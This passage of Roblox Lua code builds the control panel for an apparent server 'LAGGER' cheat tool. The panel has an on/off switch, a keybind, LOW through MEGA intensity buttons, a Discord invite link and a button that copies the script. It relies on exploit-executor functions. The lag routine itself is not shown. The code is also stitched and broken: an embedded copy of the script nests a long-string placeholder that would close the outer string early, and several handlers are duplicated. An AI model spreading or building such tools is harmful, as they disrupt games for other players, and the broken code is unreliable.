keybindButton.TextColor3 = Color3.fromRGB(200,200,220)
keybindButton.TextSize = 6
keybindButton.AutoButtonColor = false
keybindButton.ZIndex = 2
Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0,5)
actualizarKeybindButton()

lockButton = Instance.new("TextButton", mainFrame)
lockButton.BackgroundColor3 = Color3.fromRGB(25,25,30)
lockButton.BackgroundTransparency = 0.1
lockButton.Position = UDim2.new(1,-28,0,1)
lockButton.Size = UDim2.new(0,26,0,12)
lockButton.Font = Enum.Font.GothamBlack
lockButton.TextSize = 6
lockButton.TextColor3 = Color3.fromRGB(200,200,220)
lockButton.AutoButtonColor = false
lockButton.ZIndex = 2
Instance.new("UICorner", lockButton).CornerRadius = UDim.new(0,5)
lockButton.MouseButton1Click:Connect(function() ventanaBloqueada = not ventanaBloqueada actualizarCandado() SaveConfig() end)
actualizarCandado()

-- LAGGER
textLagger = Instance.new("TextLabel", mainFrame)
textLagger.BackgroundTransparency = 1
textLagger.Position = UDim2.new(0,5,0,26)
textLagger.Size = UDim2.new(0,65,0,18)
textLagger.Font = Enum.Font.GothamBlack
textLagger.Text = "LAGGER"
textLagger.TextColor3 = Color3.fromRGB(0,0,0)
textLagger.TextSize = 11
textLagger.TextXAlignment = Enum.TextXAlignment.Left
textLagger.TextYAlignment = Enum.TextYAlignment.Center
textLagger.ZIndex = 2

-- SWITCH
toggleContainer = Instance.new("Frame", mainFrame)
toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
toggleContainer.Position = UDim2.new(1,-52,0,26)
toggleContainer.Size = UDim2.new(0,44,0,18)
toggleContainer.ZIndex = 2
Instance.new("UICorner", toggleContainer).CornerRadius = UDim.new(1,0)

toggleBall = Instance.new("Frame", toggleContainer)
toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff
toggleBall.Size = UDim2.new(0,16,0,16)
toggleBall.Position = UDim2.new(0,2,0.5,-8)
toggleBall.ZIndex = 2
Instance.new("UICorner", toggleBall).CornerRadius = UDim.new(1,0)

toggleClick = Instance.new("TextButton", toggleContainer)
toggleClick.BackgroundTransparency = 0
toggleClick.BackgroundColor3 = Color3.fromRGB(45,45,45)
toggleClick.Size = UDim2.new(1,0,1,0)
toggleClick.ZIndex = 3
toggleClick.Font = Enum.Font.GothamBlack
toggleClick.Text = "INACTIVE"
toggleClick.TextSize = 6
toggleClick.TextColor3 = Color3.fromRGB(255,0,0)
toggleClick.TextXAlignment = Enum.TextXAlignment.Center
toggleClick.TextYAlignment = Enum.TextYAlignment.Center
toggleClick.MouseButton1Click:Connect(toggleLagger)
toggleClick.AutoButtonColor = false
Instance.new("UICorner", toggleClick).CornerRadius = UDim.new(1,0)
actualizarSwitch()

-- SELETOR DE TECLA
keybindButton.MouseButton1Click:Connect(function()
    if listeningForInput then return end
    listeningForInput = true
    keybindButton.Text = "KEY: ..."
    keybindButton.BackgroundColor3 = Color3.fromRGB(200,0,0)
    keybindButton.TextColor3 = Color3.fromRGB(255,255,255)
end)

UserInputService.InputBegan:Connect(function(input, gp)
    if not listeningForInput then return end
    if gp then return end
    local newKey = input.KeyCode
    if newKey and newKey ~= Enum.KeyCode.Unknown then
        keybind = newKey
        actualizarKeybindButton()
        listeningForInput = false
        keybindButton.BackgroundColor3 = Color3.fromRGB(25,25,30)
        keybindButton.BackgroundTransparency = 0.1
        keybindButton.TextColor3 = Color3.fromRGB(200,200,220)
    end
end)

-- BOTÕES
local btnY = 48
local btnW = 40
local btnH = 18
local esp = 2
local mg = 3

btnLow = Instance.new("TextButton", mainFrame)
btnLow.Size = UDim2.new(0,btnW,0,btnH)
btnLow.Position = UDim2.new(0,mg,0,btnY)
btnLow.Font = UI_CONFIG.Font
btnLow.Text = "LOW"
btnLow.TextColor3 = Color3.fromRGB(200,200,220)
btnLow.TextSize = 7
btnLow.AutoButtonColor = false
btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
btnLow.BorderSizePixel = 1
btnLow.BorderColor3 = UI_CONFIG.BorderColor
btnLow.ZIndex = 2
Instance.new("UICorner", btnLow).CornerRadius = UDim.new(0,6)
btnLow.MouseButton1Click:Connect(function() nivelActual="Low" actualizarBotonesNivel() SaveConfig() end)

btnMid = Instance.new("TextButton", mainFrame)
btnMid.Size = UDim2.new(0,btnW,0,btnH)
btnMid.Position = UDim2.new(0,mg+btnW+esp,0,btnY)
btnMid.Font = UI_CONFIG.Font
btnMid.Text = "MID"
btnMid.TextColor3 = Color3.fromRGB(200,200,220)
btnMid.TextSize = 7
btnMid.AutoButtonColor = false
btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
btnMid.BorderSizePixel = 1
btnMid.BorderColor3 = UI_CONFIG.BorderColor
btnMid.ZIndex = 2
Instance.new("UICorner", btnMid).CornerRadius = UDim.new(0,6)
btnMid.MouseButton1Click:Connect(function() nivelActual="Mid" actualizarBotonesNivel() SaveConfig() end)

btnHigh = Instance.new("TextButton", mainFrame)
btnHigh.Size = UDim2.new(0,btnW,0,btnH)
btnHigh.Position = UDim2.new(0,mg+(btnW+esp)*2,0,btnY)
btnHigh.Font = UI_CONFIG.Font
btnHigh.Text = "HIGH"
btnHigh.TextColor3 = Color3.fromRGB(200,200,220)
btnHigh.TextSize = 7
btnHigh.AutoButtonColor = false
btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
btnHigh.BorderSizePixel = 1
btnHigh.BorderColor3 = UI_CONFIG.BorderColor
btnHigh.ZIndex = 2
Instance.new("UICorner", btnHigh).CornerRadius = UDim.new(0,6)
btnHigh.MouseButton1Click:Connect(function() nivelActual="High" actualizarBotonesNivel() SaveConfig() end)

btnUltra = Instance.new("TextButton", mainFrame)
btnUltra.Size = UDim2.new(0,btnW,0,btnH)
btnUltra.Position = UDim2.new(0,mg+(btnW+esp)*3,0,btnY)
btnUltra.Font = UI_CONFIG.Font
btnUltra.Text = "ULTRA"
btnUltra.TextColor3 = Color3.fromRGB(200,200,220)
btnUltra.TextSize = 6
btnUltra.AutoButtonColor = false
btnUltra.BackgroundColor3 = UI_CONFIG.ButtonInact
btnUltra.BorderSizePixel = 1
btnUltra.BorderColor3 = UI_CONFIG.BorderColor
btnUltra.ZIndex = 2
Instance.new("UICorner", btnUltra).CornerRadius = UDim.new(0,6)
btnUltra.MouseButton1Click:Connect(function() nivelActual="Ultra" actualizarBotonesNivel() SaveConfig() end)

btnMega = Instance.new("TextButton", mainFrame)
btnMega.Size = UDim2.new(0,btnW,0,btnH)
btnMega.Position = UDim2.new(0,mg+(btnW+esp)*4,0,btnY)
btnMega.Font = UI_CONFIG.Font
btnMega.Text = "MEGA"
btnMega.TextColor3 = Color3.fromRGB(200,200,220)
btnMega.TextSize = 6
btnMega.AutoButtonColor = false
btnMega.BackgroundColor3 = UI_CONFIG.ButtonInact
btnMega.BorderSizePixel = 1
btnMega.BorderColor3 = UI_CONFIG.BorderColor
btnMega.ZIndex = 2
Instance.new("UICorner", btnMega).CornerRadius = UDim.new(0,6)
btnMega.MouseButton1Click:Connect(function() nivelActual="Mega" actualizarBotonesNivel() SaveConfig() end)

actualizarBotonesNivel()

-- BOTÃO DISCORD
local discordLink = "https://discord.com/channels/1528914579843977497/1531377016195121333"
discordButton = Instance.new("ImageButton", mainFrame)
discordButton.BackgroundTransparency = 1
discordButton.Image = "rbxassetid://83588180830854"
discordButton.Size = UDim2.new(0,70,0,14)
discordButton.Position = UDim2.new(0,130,0,92)
discordButton.ZIndex = 2
discordButton.AutoButtonColor = false

discordText = Instance.new("TextLabel", discordButton)
discordText.BackgroundTransparency = 1
discordText.Size = UDim2.new(1,0,1,0)
discordText.Font = Enum.Font.GothamBlack
discordText.Text = "discord"
discordText.TextColor3 = Color3.fromRGB(0,0,0)
discordText.TextSize = 8
discordText.TextXAlignment = Enum.TextXAlignment.Center
discordText.TextYAlignment = Enum.TextYAlignment.Center
discordText.ZIndex = 3

discordButton.MouseButton1Click:Connect(function()
    local success = pcall(function()
        if setclipboard then setclipboard(discordLink)
        elseif toclipboard then toclipboard(discordLink) end
    end)
    if success then
        local old = discordText.TextColor3
        discordText.TextColor3 = Color3.fromRGB(0,255,0)
        task.wait(0.3)
        discordText.TextColor3 = old
    end
end)

-- BOTÃO COPIAR
copyButton = Instance.new("TextButton", mainFrame)
copyButton.BackgroundColor3 = Color3.fromRGB(30,30,40)
copyButton.BackgroundTransparency = 0.1
copyButton.Size = UDim2.new(0, 55, 0, 12)
copyButton.Position = UDim2.new(1, -60, 0, 94)
copyButton.Font = Enum.Font.GothamBlack
copyButton.Text = "📋 Copiar"
copyButton.TextColor3 = Color3.fromRGB(255,255,255)
copyButton.TextSize = 6
copyButton.AutoButtonColor = false
copyButton.ZIndex = 2
Instance.new("UICorner", copyButton).CornerRadius = UDim.new(0,4)

copyButton.MouseButton1Click:Connect(function()
    local scriptText = [==[ ... ]==] -- O script completo vai aqui
    local success = pcall(function()
        if setclipboard then setclipboard(scriptText)
        elseif toclipboard then toclipboard(scriptText) end
    end)
    if success then
        copyButton.Text = "✅ Copiado!"
        task.wait(1.5)
        copyButton.Text = "📋 Copiar"
    end
end)

-- ARRASTAR
local isDragging, dragStart, startPos = false, nil, nil
mainFrame.InputBegan:Connect(function(input)
    if ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if not isDragging or ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
mainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = false
    end
end)

-- ATALHO DE TECLA
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == keybind or (input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode == keybind) then
        toggleLagger()
    end
end)
]==]

copyButton.MouseButton1Click:Connect(function()
    local success = pcall(function()
        if setclipboard then setclipboard(fullScript)
        elseif toclipboard then toclipboard(fullScript) end
    end)
    if success then
        copyButton.Text = "✅ Copiado!"
        task.wait(1.5)
        copyButton.Text = "📋 Copiar"
    end
end)

-- ARRASTAR
local isDragging, dragStart, startPos = false, nil, nil
mainFrame.InputBegan:Connect(function(input)
    if ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if not isDragging or ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
mainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = false
    end
end)

-- ATALHO DE TECLA
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == keybind or (input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode == keybind) then
        toggleLagger()
    end
end)
